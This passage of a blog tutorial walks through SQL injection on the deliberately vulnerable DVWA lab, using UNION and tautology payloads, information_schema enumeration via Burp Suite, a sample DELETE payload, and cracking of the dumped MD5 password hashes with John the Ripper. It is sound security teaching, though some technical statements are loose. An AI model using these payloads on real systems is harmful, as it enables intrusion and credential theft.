&lt;p&gt;So far we created database named “mysite” and add table named users, in that table we have users ID which is must be valuable (NOT NULL) and number (INT which is an integer), in the other values we specified that each value can be long up to 255 characters (VARCHAR(255)), now we need to filled that table up.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;INSERT INTO users(id, nickName, firstName, lestName, email) VALUES
(1, 'Jimi', 'Johnny', 'Hendrix', 'jhendrix@gmail.com'),
(2, 'Jenni', 'Jennifer', 'Batten', 'jbatten@gmail.com'),
(3, 'Steve', 'Steven', 'Vai', 'svai@gmail.com'),
(4, 'Jim', 'James', 'Morrison', 'jmorrison@gmail.com'),
(5, 'AliceCooper', 'Vincent', 'Furnier', 'vfurnier@gmail.com');&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-005.png&quot; alt=&quot;sql-injection-005.png&quot; /&gt;
&lt;strong&gt;Figure 5&lt;/strong&gt; Filled up the tables with values.&lt;/p&gt;

&lt;p&gt;To display the all table, just type SELECT and asterisk FROM the table name.
&lt;img src=&quot;/assets/images/sql-injection-006.png&quot; alt=&quot;sql-injection-006.png&quot; /&gt;
&lt;strong&gt;Figure 6&lt;/strong&gt; Tables with values.&lt;/p&gt;

&lt;p&gt;Note that we can insert more that one command in the same raw.
&lt;img src=&quot;/assets/images/sql-injection-007.png&quot; alt=&quot;sql-injection-007.png&quot; /&gt;
&lt;strong&gt;Figure 7&lt;/strong&gt; More than one command.&lt;/p&gt;

&lt;p&gt;Now let’s change some email in out table, just type as follow:
&lt;img src=&quot;/assets/images/sql-injection-008.png&quot; alt=&quot;sql-injection-008.png&quot; /&gt;
&lt;strong&gt;Figure 8&lt;/strong&gt; Chenge email.&lt;/p&gt;

&lt;p&gt;So if in some website used SQL to store some data in tables from the user, if some user change his email address, this is what actually append behind the scene.&lt;/p&gt;

&lt;p&gt;We can also use some sentence that specified True of False to display something, in the next example I’m use 1=1 which mean True, this is why it display to me all of the values.
&lt;img src=&quot;/assets/images/sql-injection-009.png&quot; alt=&quot;sql-injection-009.png&quot; /&gt;
&lt;strong&gt;Figure 9&lt;/strong&gt; 1=1 is actually True.&lt;/p&gt;

&lt;p&gt;We have a way to use wildcard like the next example:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE lastName LIKE '%n';&lt;/code&gt;
In that case the query give up the last names that end with &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; which can be helpful to filter stuff.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-010.png&quot; alt=&quot;sql-injection-010.png&quot; /&gt;
&lt;strong&gt;Figure 10&lt;/strong&gt; 1=1 is actually True.&lt;/p&gt;

&lt;h3 id=&quot;what-is-the-vulnerability&quot;&gt;What is the vulnerability&lt;/h3&gt;

&lt;p&gt;So in SQL the way it’s works with website is as follow,  let’s assume that we have some filed that ask us username and password, if we type in some value like &lt;code class=&quot;highlighter-rouge&quot;&gt;guy&lt;/code&gt; and hit enter it will generate some command in SQL to the database like  &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE USERNAME = 'guy';&lt;/code&gt;, please note the quotation marks, in this way the database will bring back &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;guy&quot;&lt;/code&gt;, the problem is with those quotation marks, it little bit tricky because let’s say that the user actually put in that filed quotation marks, something that look like that:
&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE USERNAME = 'guy''&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In that case it will failed because the command is not match up, and it will send some error, so it may be annoying, but if we think about that we can do some serious damage in that way because in SQL we have more command like &lt;code class=&quot;highlighter-rouge&quot;&gt;INSERT&lt;/code&gt; to insert stuff or &lt;code class=&quot;highlighter-rouge&quot;&gt;UPDATE&lt;/code&gt; to change stuff and &lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE&lt;/code&gt; to remove data from the database, so if we write on the username filed something more like:
 &lt;code class=&quot;highlighter-rouge&quot;&gt;guy&quot;; DELETE * FROM table_name;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The command will work and because it is a SQL it will delete everything that in the table_name.&lt;/p&gt;

&lt;p&gt;The way to migrate this issue is called escaping and it’s something like the programmer will setup in the code that every time we have quotation marks just put backslash before it, in that way the quotation marks in the filed will be handled as a character and not as quotation marks in the SQL so it may help to migrate the problem with command in SQL in the user input.&lt;/p&gt;

&lt;p&gt;For that article I’m going to use DVWA which is great way to learn about vulnerability related to websites, the usual Linux Kali will be used to attack those websites and I hope you will enjoy it.
You can download DVWA from &lt;a href=&quot;http://www.dvwa.co.uk/&quot;&gt;here&lt;/a&gt;, in this web you can find the source code which contain the REDAME.md file that can help you to install the DVWA on your operation system. We going to look on only the SQL injection in that article, I hope you enjoy it! I sure that I will!:]&lt;/p&gt;

&lt;p&gt;There is a three type of SQL injection:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Error base: we make some query to the database and we get some error from it, we can extract information about the server in that way.&lt;/li&gt;
  &lt;li&gt;Union base: in that case we use more then one SELECT SQL query in the same statements and get some single result.&lt;/li&gt;
  &lt;li&gt;Blind base: in that type of SQL injection we can do more than ask the database true of false question and using whether valid page returned or not, or we can use the time it took for the page to load, we will see how that going on in that article.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;exploit-that-vulnerability&quot;&gt;Exploit that vulnerability.&lt;/h3&gt;

&lt;p&gt;Ok guys, I have done to setup my Ubuntu server with php7.0 and mysql database and the website (DVWA) is live and running. I have Kali Linux machine and from that machine we going to do the coolest stuff!
So my topology look something like that:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-011.png&quot; alt=&quot;sql-injection-011.png&quot; /&gt;
&lt;strong&gt;Figure 11&lt;/strong&gt; Topology for our lab.&lt;/p&gt;

&lt;p&gt;you can do the same I did if you like, if you have some trouble in the installation process please feel free to leave a comment here or send me an email and I’ll be glad to help.&lt;/p&gt;

&lt;p&gt;for this kind for lab you actually doesn’t need to setup spacial server just for DVWA, you can setup is on you computer and trying to attack from your Kali, or you can attack the website from your computer, it’s really doesn’t matter, you can also setup the web directly on your Kali which is the best I think.&lt;/p&gt;

&lt;p&gt;Ok, let’s look on the DVWA website, we going to do every challenge in that web that related to SQL, so let’s start from the low level security to high, if you configure everything correctly you should get the following page:
&lt;img src=&quot;/assets/images/sql-injection-012.png&quot; alt=&quot;sql-injection-012.png&quot; /&gt;
&lt;strong&gt;Figure 12&lt;/strong&gt; Topology for our lab.&lt;/p&gt;

&lt;p&gt;The default username is admin and password is password, after you login go to DVWA security tab and select low level and submit it.
&lt;img src=&quot;/assets/images/sql-injection-013.png&quot; alt=&quot;sql-injection-013.png&quot; /&gt;
&lt;strong&gt;Figure 13&lt;/strong&gt; Topology for our lab.&lt;/p&gt;

&lt;p&gt;After that go SQL injection tab, and here we going to do our magic!
As you can see the User ID box and submit button, you can trying to insert some value in that box but nothing will happened, only the URL will be change but it’s irrelevant in that point. however if you type sum number in range of 1 to 5 you get some value from the database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-014.png&quot; alt=&quot;sql-injection-014.png&quot; /&gt;
&lt;strong&gt;Figure 14&lt;/strong&gt; Data from the database.&lt;/p&gt;

&lt;p&gt;So we can see the users and their surenames, let’s play with the box little more, just write a comma &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; sign and click on the submit button it will bring up an error.
&lt;img src=&quot;/assets/images/sql-injection-015.png&quot; alt=&quot;sql-injection-015.png&quot; /&gt;
&lt;strong&gt;Figure 15&lt;/strong&gt; Data from the database.&lt;/p&gt;

&lt;p&gt;So right now we know that the web server is vulnerable for Error base attack, so let’s try to play with it more. every query are generate some sentence with quotation marks on the value that the user type, so, in the case we typed 1 in the SQL query it would be something like &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT column FROM table WHERE number='1'&lt;/code&gt;, remember we type only 1 without quotation marks, so when we type &lt;code class=&quot;highlighter-rouge&quot;&gt;1'&lt;/code&gt; it actually look like &lt;code class=&quot;highlighter-rouge&quot;&gt;number= '1''&lt;/code&gt;, so if we trying to put some query we can put in the filed something like that:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;1' or '0'='0&lt;/code&gt; &lt;br /&gt;
In that case the query will look something like that:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;number = '1' or '0'='0'&lt;/code&gt;&lt;br /&gt;
In the query case it’s put quotation marks,I’ll bold it so you can see:&lt;br /&gt;
number = &lt;strong&gt;‘&lt;/strong&gt; 1’ or ‘0’=’0 &lt;strong&gt;‘&lt;/strong&gt;&lt;br /&gt;
In that case it look like we add another values to the SQL query and the 0=0 is sort of True query, so the answer we get will be all the values because the existing of the value is true, let’s look how is works in the SQL, if we type that query we get the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-016.png&quot; alt=&quot;sql-injection-016.png&quot; /&gt;
&lt;strong&gt;Figure 16&lt;/strong&gt; SQL query.&lt;/p&gt;

&lt;p&gt;Now we extract all users from database because the True statement, every value is True so this is why we get every value from the table.&lt;/p&gt;

&lt;p&gt;We can adding UNION to sql statement which mean that we use 2 SELECTED statement at once, so, we can write a brand new command in the input box and maybe the SQL will treat that statement as usual, please remember that if we use UNIUN, we can only use that in SELECT statement, and the SELECT statement must be query of equal column, as example the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;SELECT firstName, lastName, email LIKE '%te%' FROM users UNION SELECT firstName, lastName, email LIKE '%r%' FROM users;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In this statement we query the firstName and lastName from our mysite table and we display also the  who have email that contain ‘te’ in it, in the union we do the same but this time the query should display the rows from our table that contain ‘r’ in the email filed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-017.png&quot; alt=&quot;sql-injection-017.png&quot; /&gt;
&lt;strong&gt;Figure 17&lt;/strong&gt; SQL query with UNION.&lt;/p&gt;

&lt;p&gt;Please note that we have a third column that contain &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, which specified answer to our query. So if we go back to our Kali machine we can use UNION to display two SELECT at once, just inject the follow:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' union select first_name,last_name from users WHERE user_id='2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this is the SQL answer we get for that query:
&lt;img src=&quot;/assets/images/sql-injection-018.png&quot; alt=&quot;sql-injection-018.png&quot; /&gt;
&lt;strong&gt;Figure 18&lt;/strong&gt; SQL query with UNION display two users.&lt;/p&gt;

&lt;p&gt;Please note that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;first_name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;last_name&lt;/code&gt; for my query, you may ask how did I now that the column names are like that? if you check that website you will see the View Source button and if you click on that you will see the php code that contain the query with &lt;code class=&quot;highlighter-rouge&quot;&gt;first_name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;last_name&lt;/code&gt;, but please remember that in the real world it doesn’t likely you can view some php code of some site, normally the php code used as server side so you never been access to that code directly, you may try to extract that code with XSS or CSRF or any sort of attacks, but in some cases you may guess the query, just remember that the developer may used some common names, so it may be more simple to guess that column names than extract the code that contain the query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-019.png&quot; alt=&quot;sql-injection-019.png&quot; /&gt;
&lt;strong&gt;Figure 19&lt;/strong&gt; Source code.&lt;/p&gt;

&lt;p&gt;I want you to new that there is more data that we can find about the database it self and it inportent to know that stuff so just follow me, you can make a SELECT query from the database for find boxes from the table without any value, so let’s say that in our table there is some box without value, we can may query to find this boxes as follow:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;SELECT first_name FROM users WHERE the middle_name IS NULL;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In that case that query bring us any user that he have no middle name, so that is the main used for NULL, there is another way to use it, but before that there is more things you should know, there is a way to query some data about the database it self, there is some  &lt;a href=&quot;https://www.w3schools.com/sql/sql_ref_mysql.asp&quot;&gt;functions&lt;/a&gt; that used for check some values related to the database itself or mysql server we working on, as example what is the user we used for mysql, what is the version of mysql database, what is the name of the database we working on it and so on.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;USE mysite;
SELECT database();&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In that case the database will show us his name after we chose the database, in my case the database name will be ‘mysite’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-024.png&quot; alt=&quot;sql-injection-024.png&quot; /&gt;
&lt;strong&gt;Figure 24&lt;/strong&gt; Database function.&lt;/p&gt;

&lt;p&gt;So let’s think carefully, we have a way to extract data about the database, but if we use injection with &lt;code class=&quot;highlighter-rouge&quot;&gt;UNION&lt;/code&gt; we must use in our case two SELECT query because the original query that the php code produces include two column, so if we do something like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;select
  first_name,
  last_name
  FROM users WHERE user_id='1' or '0'='0'
  UNION
  SELECT database();&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;we will get an error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-025.png&quot; alt=&quot;sql-injection-025.png&quot; /&gt;
&lt;strong&gt;Figure 25&lt;/strong&gt; Erorr “different number of columns”.&lt;/p&gt;

&lt;p&gt;For that matter we need to use other query that contain &lt;code class=&quot;highlighter-rouge&quot;&gt;UNION SELECT&lt;/code&gt; with two another columns, we can achieve that goal with NULL, to doing so just type the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;select
  first_name,
  last_name
  FROM users WHERE user_id='1' or '0'='0'
  UNION
  SELECT NULL, database();&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So, we can use sort of function query to extract more data about the database and it’s important that you new them all or most of them:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;SELECT NULL, database();
SELECT NULL, user();
SELECT NULL, version();&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-026.png&quot; alt=&quot;sql-injection-026.png&quot; /&gt;
&lt;strong&gt;Figure 26&lt;/strong&gt; Select null with function.&lt;/p&gt;

&lt;p&gt;Now we know lets do some injection.
&lt;img src=&quot;/assets/images/sql-injection-027.png&quot; alt=&quot;sql-injection-027.png&quot; /&gt;
&lt;strong&gt;Figure 27&lt;/strong&gt; database() - for seen the database name.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-028.png&quot; alt=&quot;sql-injection-028.png&quot; /&gt;
&lt;strong&gt;Figure 28&lt;/strong&gt; version() - for seen the version of our sql database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-029.png&quot; alt=&quot;sql-injection-029.png&quot; /&gt;
&lt;strong&gt;Figure 29&lt;/strong&gt; user() - for seen the user that used fro connection the sql server.&lt;/p&gt;

&lt;p&gt;we will use in these commands a lot in this article, it is very important to know such information because let’s say in some mysql version you can do more stuff that in older version you can’t do, as example the command &lt;code class=&quot;highlighter-rouge&quot;&gt;ROW_NUMBER()&lt;/code&gt; can be use in mysql version 8.0.2, but not in version 5.5. You can view in detail the &lt;a href=&quot;https://dev.mysql.com/doc/mysqld-version-reference/en/mysqld-version-reference-opsfuncs.html&quot;&gt;mysqld-version-reference.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now let’s do the same with SELECT sentence that contain some query for password, the query I need to accomplish should look as follow:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = '1' union SELECT first_name, password FROM users WHERE user_id='1';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the injection code look like that:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' union SELECT first_name, password FROM users WHERE user_id='1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-020.png&quot; alt=&quot;sql-injection-020.png&quot; /&gt;
&lt;strong&gt;Figure 20&lt;/strong&gt; Extract some password.&lt;/p&gt;

&lt;p&gt;Well guys, did you saw that? the password is in the surname filed! it look like sort of hash so we need some tool that can find for us the real value of that hash. There is many hash crack out there, just for reminder, hash is some data that some cryptographic function was run on it and produces output of  160-bit value, please note that this is difference from encryption method, in hashing method you can’t extract the original data value from the hashing value because it is &lt;a href=&quot;https://en.wikipedia.org/wiki/One-way_function&quot;&gt;one-way function&lt;/a&gt;, so the way to find some hashing of some value is to take some data and run the hash function on it and compare the output to the hashing value you wanted to, and if there is a match you now know what is the original value.&lt;/p&gt;

&lt;p&gt;In our case I guess the hash value is md5 type so we can check in our linux machineand find a match, just type the command as follow:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; password | &lt;span class=&quot;nb&quot;&gt;md5sum&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-021.png&quot; alt=&quot;sql-injection-021.png&quot; /&gt;
&lt;strong&gt;Figure 21&lt;/strong&gt; Hash value.&lt;/p&gt;

&lt;p&gt;Now if you compare the output to the hash value we already have from our database, this is the same value! which mean that the password is actually “password”. If you want to use some online database of crack hashing you can used this links:
&lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt;
&lt;a href=&quot;https://hashkiller.co.uk/md5-decrypter.aspx&quot;&gt;hashkiller&lt;/a&gt;
&lt;a href=&quot;https://www.onlinehashcrack.com/&quot;&gt;onlinehashcrack&lt;/a&gt;
I am using them a lot and they very helpful.&lt;/p&gt;

&lt;p&gt;So, from that output we know that admin password is ‘password’… so typical lol :P&lt;/p&gt;

&lt;p&gt;let’s try to extract other password from the database, just inject the follow:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1' union SELECT first_name, password FROM users WHERE user_id='1' or '0'='0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And that is it, all we need now is find out what is the real value for that hashs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-022.png&quot; alt=&quot;sql-injection-022.png&quot; /&gt;
&lt;strong&gt;Figure 22&lt;/strong&gt; Hashs passwords.&lt;/p&gt;

&lt;p&gt;Let’s crack all password with john the ripper, just take the data and past it in some text editor with the following structure:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;usename:hachPassword
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I saved the data in text.txt file, then type the following command in your terminal:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=raw-MD5 text.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-023.png&quot; alt=&quot;sql-injection-023.png&quot; /&gt;
&lt;strong&gt;Figure 23&lt;/strong&gt; john the ripper.&lt;/p&gt;

&lt;p&gt;Please note that so far we used Union base to find the data we needed, we will implement more injection types in this article, just bear with me for a moment.&lt;/p&gt;

&lt;p&gt;Now let’s go to the higher level, change the security level to medium and go back to SQL Injection page, &lt;img src=&quot;/assets/images/sql-injection-030.png&quot; alt=&quot;sql-injection-030.png&quot; /&gt;
&lt;strong&gt;Figure 30&lt;/strong&gt; Security level medium.&lt;/p&gt;

&lt;p&gt;Now in the SQL Injection you see that there is no user input, we have some selected box and now we can only select from 1 to 5 and see the user username and surname, so you may ask what we can do now? there no way to inject some query value in that case. You may right but not so quite, there is no input box for the user that true, but now we need some way to make query from the browser and change that query before it will sending to the server, to do so I am going to use burpsuite tool. In that tool we can use local proxy to transfer all our data through burpsuite and then we can change the query before it go to the server.&lt;/p&gt;

&lt;p&gt;Before we use burpsuite we need to set our browser to use proxy which will be the burpsuite, just go to the menu in your browser and click on preferences.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-031.png&quot; alt=&quot;sql-injection-031.png&quot; /&gt;
&lt;strong&gt;Figure 31&lt;/strong&gt; Security level medium.&lt;/p&gt;

&lt;p&gt;Or press F12 on your key board and go to advance&amp;gt;network&amp;gt;setting.
&lt;img src=&quot;/assets/images/sql-injection-032.png&quot; alt=&quot;sql-injection-032.png&quot; /&gt;
&lt;strong&gt;Figure 32&lt;/strong&gt; Security level medium.&lt;/p&gt;

&lt;p&gt;Then change to Menual proxy configuration with http proxy of 127.0.0.1 which is localhost and port 8080.
&lt;img src=&quot;/assets/images/sql-injection-033.png&quot; alt=&quot;sql-injection-033.png&quot; /&gt;
&lt;strong&gt;Figure 33&lt;/strong&gt; Security level medium.&lt;/p&gt;

&lt;p&gt;On linux Kali the burpsuite is buildin so just click on the burpsuite icon in the bar slide and then go to proxy&amp;gt;intercept and click on “Intercept is off” button, by pressing that it will change to “Intercept is on”, now in the SQL Injection page if we press on submit button we will see in row tab of burpsuite the data that going to be send and all we need to do next is to change it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-034.png&quot; alt=&quot;sql-injection-034.png&quot; /&gt;
&lt;strong&gt;Figure 34&lt;/strong&gt; Security level medium.&lt;/p&gt;

&lt;p&gt;Now let’s use the Error base technique, we know that we have some query and we don’t need to new the database name, but we need to know the number of column in the original query because we want to use UNION and in that case we must to use equal column number for our injected query, for doing so we can use the command ORDER BY column number. ORDER BY used for ordering the value inside the columns, so if we type ORDER BY 1 it will order our request by column 1 in alpha beta form, and if we type ORDER BY 2 it will order our column number 2.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-035.png&quot; alt=&quot;sql-injection-035.png&quot; /&gt;
&lt;strong&gt;Figure 35&lt;/strong&gt; ORDER BY example.&lt;/p&gt;

&lt;p&gt;In case we type some number that not match the columns we will get some error, so in my case if I type ORDER BY 6 it will bring me an error because I haven’t column 6.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-036.png&quot; alt=&quot;sql-injection-036.png&quot; /&gt;
&lt;strong&gt;Figure 36&lt;/strong&gt; ORDER BY error.&lt;/p&gt;

&lt;p&gt;So, let’s try that up in on our target, just type the injection query in the burpsuite as follow and press on forward:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1 ORDER BY 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-037.png&quot; alt=&quot;sql-injection-037.png&quot; /&gt;
&lt;strong&gt;Figure 37&lt;/strong&gt; ORDER BY 1.&lt;/p&gt;

&lt;p&gt;We have no error so let’s try:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1 ORDER BY 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-038.png&quot; alt=&quot;sql-injection-038.png&quot; /&gt;
&lt;strong&gt;Figure 38&lt;/strong&gt; ORDER BY error.&lt;/p&gt;

&lt;p&gt;Cool! we have some error, so this is mean that we have no column 3 in the table, now let’s try check column 2, it more likely that it will work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-039.png&quot; alt=&quot;sql-injection-039.png&quot; /&gt;
&lt;strong&gt;Figure 39&lt;/strong&gt; ORDER BY 2.&lt;/p&gt;

&lt;p&gt;It work! so now we know that we have 2 column in that table so if we using UNION we need to select two columns in our query, but we still need more data like the columns name and tables name, we can guess it but there is a way to extract that out, for doing so we going to use &lt;a href=&quot;https://dev.mysql.com/doc/refman/5.7/en/information-schema.html&quot;&gt;information_schema.&lt;/a&gt;, this is the way  to provide access to the database metadata so we can make some query about the columns name with that option, just type as follow:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1 UNION SELECT null, column_name FROM information_schema.columns&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-040.png&quot; alt=&quot;sql-injection-040.png&quot; /&gt;
&lt;strong&gt;Figure 40&lt;/strong&gt; information_schema.columns.&lt;/p&gt;

&lt;p&gt;So now we have the name of all the column name from all database that exist in that sql server, and if we scroll down little bit we will find some value that look like what we search so far.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-041.png&quot; alt=&quot;sql-injection-041.png&quot; /&gt;
&lt;strong&gt;Figure 41&lt;/strong&gt; Column values name.&lt;/p&gt;

&lt;p&gt;New let’s check the tables name with information_schema.tables&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1 UNION SELECT null, table_name FROM information_schema.tables&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-042.png&quot; alt=&quot;sql-injection-042.png&quot; /&gt;
&lt;strong&gt;Figure 42&lt;/strong&gt; tables name.&lt;/p&gt;

&lt;p&gt;So the users table is what we looking for. Now we can accomplish the command we want in the first place, now inject the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;1 UNION SELECT first_name, password FROM users&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-043.png&quot; alt=&quot;sql-injection-043.png&quot; /&gt;
&lt;strong&gt;Figure 43&lt;/strong&gt; users and password.&lt;/p&gt;

&lt;p&gt;We did it again guys!!! we won!!! or more likely we own the database!!!! GAME OVER!
&lt;img src=&quot;/assets/images/sql-injection-044.png&quot; alt=&quot;sql-injection-044.png&quot; /&gt;
&lt;strong&gt;Figure 44&lt;/strong&gt; GAME OVER.&lt;/p&gt;

&lt;p&gt;Let’s go to the next level! but before that I want you to solve by yourself the the High Level, this time you have all of the knowledge you need to do so, after you finish please step foreword and see how I solved that level, if your solution is different then my, please let me know:) or comment down below.&lt;/p&gt;

&lt;p&gt;After you change the level on “DVWA Security” to High Level, you can see that in SQL Injection page, now you have some link that open new window for you type in the ID you want, and if we typed the injection like we done so far it doesn’t work for us:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sql-injection-045.png&quot; alt=&quot;sql-injection-045.png&quot; /&gt;
&lt;strong&gt;Figure 45&lt;/strong&gt; The injection doesn’t work.&lt;/p&gt;

&lt;p&gt;So as you can see we expected to see every user in the table but unfortunately we got 1 error line that not look like sql error, and now if we type some other query that should bring up an error, this is not work as well:
&lt;img src=&quot;/assets/images/sql-injection-046.png&quot; alt=&quot;sql-injection-046.png&quot; /&gt;
&lt;strong&gt;Figure 46&lt;/strong&gt; No sql error.&lt;/p&gt;

&lt;p&gt;As you can see I just add a single quote “&lt;strong&gt;‘&lt;/strong&gt;” to the query and I got “something went wrong” that mean we have no errors in that level like we saw in other levels.&lt;/p&gt;

